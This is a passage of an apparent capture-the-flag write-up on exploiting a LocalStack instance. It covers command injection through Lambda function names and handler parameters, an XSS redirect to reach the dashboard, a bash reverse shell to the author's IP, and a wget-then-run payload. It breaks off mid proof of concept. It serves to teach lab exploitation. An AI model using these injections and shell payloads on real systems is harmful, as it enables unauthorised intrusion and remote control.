+  <span class="nt">&lt;section</span> <span class="na">id=</span><span class="s">"content"</span> <span class="na">role=</span><span class="s">"main"</span> <span class="na">ui-view</span> <span class="na">class=</span><span class="s">"fullsize"</span> <span class="na">style=</span><span class="s">"position: absolute; top: 0px; padding-top: 40px; z-index: 1"</span><span class="nt">&gt;</span> <span class="nt">&lt;/section&gt;</span>
+
+<span class="nt">&lt;/div&gt;</span>
+...[snip]...
+</code></pre></div></div>
+<p>This is a shell page that uses JavaScript to load the rest of the application. That’s ok for now, but worth keeping in mind.</p>
+<h4 id="initial-attempt">Initial Attempt</h4>
+<p>Given that the dashboard exists, this seems like a valuable path to explore. The exploit is simply putting an injection into the function name, and then visiting the dashboard. I tried some shots in the dark to get this to work, such as:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> <span class="s1">'ex; ping -c 1 10.10.14.6'</span> <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--handler</span> index.handler <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "ex; ping -c 1 10.10.14.6",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex; ping -c 1 10.10.14.6",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T18:38:39.821+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "eefc33ce-bc21-4f97-963f-9a2aa2c3987d",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>I’ll trigger the XSS to get the dashboard again and listen with <code class="language-plaintext highlighter-rouge">tcpdump</code>, but no ICMP arrived.</p>
+<h4 id="local">Local</h4>
+<p>Because this is a lot to troubleshoot over a waiting for XSS, I’ll set up a local copy. I had to move Burp to a different port, as LocalStack wants 8080. I have the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file. In the directory with that file, I’ll run <code class="language-plaintext highlighter-rouge">docker-compose up</code>, and it starts.</p>
+<p>On <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080</code> there’s a dashboard:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210825144301535.webp" type="image/webp"/>
+<img alt="image-20210825144301535" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210825144301535.png"/>
+</picture>
+<p>To interact with my local copy of LocalStack, I’ll use <a href="https://github.com/localstack/awscli-local">awslocal</a>, <code class="language-plaintext highlighter-rouge">pip3 install awscli-local</code>) to avoid having to put the <code class="language-plaintext highlighter-rouge">--endpoint-url</code> string in to interact with the local copy, as well as making clear which instance I’m working with.</p>
+<p>I’ll create a Lambda function:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>awslocal lambda create-function <span class="nt">--function-name</span> <span class="s1">'ex'</span> <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--handler</span> index.handler <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "ex",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T18:50:03.403+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "02efdc6d-506b-489b-861e-97026426a94d",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>On refreshing the dashboard, first there’s a spinner suggesting it’s loading, and about five seconds later, it shows my lambda:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210825145206991.webp" type="image/webp"/>
+<img alt="image-20210825145206991" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210825145206991.png"/>
+</picture>
+<p>I’ll try creating one named <code class="language-plaintext highlighter-rouge">ex;ping -c 1 172.17.0.1</code> (my local IP on the docker net). On refreshing, again, it takes five to ten seconds, but then it loads:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210825145440757.webp" type="image/webp"/>
+<img alt="image-20210825145440757" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210825145440757.png"/>
+</picture>
+<p>There’s also ICMP packets at <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> docker0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+14:55:23.581855 IP 172.17.0.2 &gt; 172.17.0.1: ICMP echo request, id 731, seq 1, length 64
+14:55:23.581911 IP 172.17.0.1 &gt; 172.17.0.2: ICMP echo reply, id 731, seq 1, length 64
+</span></code></pre></div></div>
+<p>This is RCE, and good because it confirms the vulnerability works, even on the latest image. But it’s bad because it shows why it’s failing remotely - the page has to fully load, and my XSS JavaScript is only requesting the page source, so unlike a browser, it doesn’t then try to load and execute all the JavaScript on that page.</p>
+<h4 id="iframe">IFrame</h4>
+<p><a href="https://stackoverflow.com/questions/19328143/xmlhttprequest-to-fetch-dom-with-dynamic-content">This post</a> on StackOverflow asks about how to use an <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> to fetch the DOM based on dynamic content. I’ll use that to craft a payload that will load the page into an iframe, and wait for it to load.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://127.0.0.1:8080</span><span class="dl">'</span><span class="p">;</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>    
+  <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>    
+    <span class="nx">iframe</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>    
+    <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>    
+<span class="p">};</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">sandbox</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">allow-scripts</span><span class="dl">'</span><span class="p">;</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">1px</span><span class="dl">'</span><span class="p">;</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">1px</span><span class="dl">'</span><span class="p">;</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">fixed</span><span class="dl">'</span><span class="p">;</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">top</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-9px</span><span class="dl">'</span><span class="p">;</span>    
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">left</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-9px</span><span class="dl">'</span><span class="p">;</span>
+
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>    
+</code></pre></div></div>
+<p>I’ll send an XSS to fetch that, and submit a new lambda function:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> <span class="s1">'ex; ping -c 1 10.10.14.6'</span> <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--handler</span> index.handler <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "ex; ping -c 1 10.10.14.6",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex; ping -c 1 10.10.14.6",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T19:04:26.602+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "2e71059f-9d2f-4679-a2b6-f0d4469a5147",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>After a minute or so, there’s a request at the webserver:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.112 - - [25/Aug/2021 15:06:11] "GET /xss-6.js HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>Four seconds later ICMP arrives:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+15:06:15.548696 IP 10.10.11.112 &gt; 10.10.14.6: ICMP echo request, id 604, seq 1, length 64
+15:06:15.548734 IP 10.10.14.6 &gt; 10.10.11.112: ICMP echo reply, id 604, seq 1, length 64
+</span></code></pre></div></div>
+<p>That’s remote RCE!</p>
+<h4 id="alternative-to-iframe">Alternative to IFrame</h4>
+<p>When talking to IppSec about how I solved this, he pointed out that my original XSS payload would have actually made this much easier. Instead of loading remote script, I can send:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://127.0.0.1:8080</span><span class="dl">"</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>This will redirect the entire browser session over to the dashboard, and, as long as the automation is done with a full emulated browser (which it is), it will load the page and the JavaScript, loading the full application.</p>
+<h4 id="shell">Shell</h4>
+<p>I’ll create a simple reverse shell script, <code class="language-plaintext highlighter-rouge">shell.sh</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>I’ll submit a lambda again, this time with the name:</p>
+<div class="language-bash wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">--function-name</span> <span class="s1">'ex; wget 10.10.14.6/shell.sh -O /tmp/.0xdf.sh; bash /tmp/.0xdf.sh'</span>
+</code></pre></div></div>
+<p>This payload will request <code class="language-plaintext highlighter-rouge">shell.sh</code> from my server and store it in <code class="language-plaintext highlighter-rouge">/tmp/.0xdf.sh</code>, and then run it with Bash.</p>
+<p>After a couple minutes it requests the XSS payload, and then four seconds later the shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.112 - - [25/Aug/2021 15:21:04] "GET /xss-6.js HTTP/1.1" 200 -
+10.10.11.112 - - [25/Aug/2021 15:21:08] "GET /shell.sh HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>And then there’s a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.112] 51690
+bash: cannot set terminal process group (22): Not a tty
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+</span><span class="gp">bash-5.0$</span><span class="w">
+</span></code></pre></div></div>
+<p>I can upgrade with <code class="language-plaintext highlighter-rouge">python</code> and <code class="language-plaintext highlighter-rouge">pty</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="go">python3 -c 'import pty;pty.spawn("bash")'
+bash: /root/.bashrc: Permission denied
+</span><span class="gp">bash-5.0$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+</span><span class="gp">bash-5.0$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And there’s <code class="language-plaintext highlighter-rouge">user.txt</code> in <code class="language-plaintext highlighter-rouge">/home/localstack</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0$</span><span class="w"> </span><span class="nb">cat</span> /home/localstack/user.txt
+<span class="go">c877918f************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root-on-localstack">Shell as root on localstack</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="container-fs">Container FS</h4>
+<p>I’m currently the localstaack user in what is clearly a container. The container has the IP 172.17.0.2, and there’s a <code class="language-plaintext highlighter-rouge">/.dockerenv</code> file.</p>
+<p>There’s two user home directories, <code class="language-plaintext highlighter-rouge">localstack</code> and <code class="language-plaintext highlighter-rouge">node</code>.  Both are completely empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> home/localstack/
+<span class="go">total 12
+drwxr-sr-x    1 localsta localsta      4096 Jul 19 17:46 .
+drwxr-xr-x    1 root     root          4096 Feb  1  2021 ..
+lrwxrwxrwx    1 root     localsta         9 Jul 19 17:46 .ash_history -&gt; /dev/null
+-r--r-----    1 root     localsta        33 Jul 12 13:59 user.txt
+</span><span class="gp">bash-5.0$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> home/node/
+<span class="go">total 8
+drwxr-sr-x    2 node     node          4096 Dec 17  2020 .
+drwxr-xr-x    1 root     root          4096 Feb  1  2021 ..
+</span></code></pre></div></div>
+<p>The LocalStack code is at <code class="language-plaintext highlighter-rouge">/opt/code/localstack</code>, but it also looks like what came from GitHub.</p>
+<h4 id="processes">Processes</h4>
+<p>In a situation where I need a Linux privesc but can’t find anything on the file system, I’ll turn to <a href="https://github.com/DominicBreuker/pspy">pspy</a> to look at running processes. I’ll upload <code class="language-plaintext highlighter-rouge">pspy64</code> to the container and give it a run. Typically I’m looking for anything unusual that runs periodically, but <code class="language-plaintext highlighter-rouge">pspy</code> doesn’t reveal anything running on a schedule like a cron.</p>
+<p>The idea here is to look at what runs when I create and invoke a Lambda function. I’ll go back to my original NodeJs POC that worked, and upload it as a new Lambda named <code class="language-plaintext highlighter-rouge">ex</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> <span class="s1">'ex'</span> <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--handler</span> index.handler <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "ex",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T20:28:45.729+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "3c04057b-f2b2-4ae6-a670-819ddc31a65a",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">pspy</code>, that’s a single process that starts, running <code class="language-plaintext highlighter-rouge">unzip</code> on an archive, presumably the one I just uploaded:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2021/08/25 20:28:45 CMD: UID=0    PID=990    | unzip -o -q /tmp/localstack/zipfile.83615cde/original_lambda_archive.zip
+</code></pre></div></div>
+<p>I’ll <code class="language-plaintext highlighter-rouge">invoke</code> the Lambda:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda invoke <span class="nt">--function-name</span> ex <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb out.json
+<span class="go">{
+    "StatusCode": 200,
+    "LogResult": "",
+    "ExecutedVersion": "$LATEST"
+}
+</span></code></pre></div></div>
+<p>Three additional processes start:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2021/08/25 20:30:59 CMD: UID=0    PID=1003   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
+2021/08/25 20:30:59 CMD: UID=0    PID=1002   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
+2021/08/25 20:30:59 CMD: UID=0    PID=1010   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID";
+</code></pre></div></div>
+<h3 id="command-injection-in-localstack">Command Injection in LocalStack</h3>
+<h4 id="looking-for-injection">Looking for Injection</h4>
+<p>Each of these look the same, so I’ll break one down with whitespace and syntax. There’s three commands run by <code class="language-plaintext highlighter-rouge">sh</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh <span class="nt">-c</span> <span class="nv">CONTAINER_ID</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>docker create <span class="nt">-i</span>   <span class="nt">-e</span> <span class="nv">DOCKER_LAMBDA_USE_STDIN</span><span class="o">=</span><span class="s2">"</span><span class="nv">$DOCKER_LAMBDA_USE_STDIN</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">LOCALSTACK_HOSTNAME</span><span class="o">=</span><span class="s2">"</span><span class="nv">$LOCALSTACK_HOSTNAME</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">EDGE_PORT</span><span class="o">=</span><span class="s2">"</span><span class="nv">$EDGE_PORT</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">_HANDLER</span><span class="o">=</span><span class="s2">"</span><span class="nv">$_HANDLER</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">AWS_LAMBDA_FUNCTION_TIMEOUT</span><span class="o">=</span><span class="s2">"</span><span class="nv">$AWS_LAMBDA_FUNCTION_TIMEOUT</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">AWS_LAMBDA_FUNCTION_NAME</span><span class="o">=</span><span class="s2">"</span><span class="nv">$AWS_LAMBDA_FUNCTION_NAME</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">AWS_LAMBDA_FUNCTION_VERSION</span><span class="o">=</span><span class="s2">"</span><span class="nv">$AWS_LAMBDA_FUNCTION_VERSION</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">AWS_LAMBDA_FUNCTION_INVOKED_ARN</span><span class="o">=</span><span class="s2">"</span><span class="nv">$AWS_LAMBDA_FUNCTION_INVOKED_ARN</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">AWS_LAMBDA_COGNITO_IDENTITY</span><span class="o">=</span><span class="s2">"</span><span class="nv">$AWS_LAMBDA_COGNITO_IDENTITY</span><span class="s2">"</span> <span class="nt">-e</span> <span class="nv">NODE_TLS_REJECT_UNAUTHORIZED</span><span class="o">=</span><span class="s2">"</span><span class="nv">$NODE_TLS_REJECT_UNAUTHORIZED</span><span class="s2">"</span>   <span class="nt">--rm</span> <span class="s2">"lambci/lambda:nodejs12.x"</span> <span class="s2">"index.handler"</span><span class="si">)</span><span class="s2">"</span><span class="p">;</span>
+docker <span class="nb">cp</span> <span class="s2">"/tmp/localstack/zipfile.4ef57e23/."</span> <span class="s2">"</span><span class="nv">$CONTAINER_ID</span><span class="s2">:/var/task"</span><span class="p">;</span>
+docker start <span class="nt">-ai</span> <span class="s2">"</span><span class="nv">$CONTAINER_ID</span><span class="s2">"</span><span class="p">;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">docker create</code>, <code class="language-plaintext highlighter-rouge">docker cp</code>, and <code class="language-plaintext highlighter-rouge">docker start</code>. Looking across all of that, the only place I really have input is in the first, which once I remove all the <code class="language-plaintext highlighter-rouge">-e</code> parameters that set environment vars in the container, looks like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker create <span class="nt">-i</span> <span class="nt">--rm</span> <span class="s2">"lambci/lambda:nodejs12.x"</span> <span class="s2">"index.handler"</span>
+</code></pre></div></div>
+<p>What’s interesting here is that I control the input for the image name and the function that’s called.</p>
+<h4 id="poc">POC</h4>
+<p>To test for command injection in the <code class="language-plaintext highlighter-rouge">--handler</code> option, I’ll create a Lambda with a subshell in it to <code class="language-plaintext highlighter-rouge">wget</code> the path <code class="language-plaintext highlighter-rouge">/test</code> on my host:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> <span class="s1">'ex'</span> <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--handler</span> <span class="s1">'index.handler$(wget 10.10.14.6/test)'</span> <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "ex",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler$(wget 10.10.14.6/test)",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T20:49:18.858+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "1fbfe1e9-d714-4a7c-b0d0-d303dc15650e",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>When I invoke this, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda invoke <span class="nt">--function-name</span> ex <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb out.json
+<span class="go">{
+    "StatusCode": 200,
+    "FunctionError": "Unhandled",
+    "LogResult": "",
+    "ExecutedVersion": "$LATEST"
+}
+</span></code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">pspy</code>, the same three processes, but one more before it:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2021/08/25 20:55:27 CMD: UID=0    PID=1389   | wget 10.10.14.6/test 
+2021/08/25 20:55:27 CMD: UID=0    PID=1388   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler;$(wget 10.10.14.6/test)")";docker cp "/tmp/localstack/zipfile.0e05eb2c/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
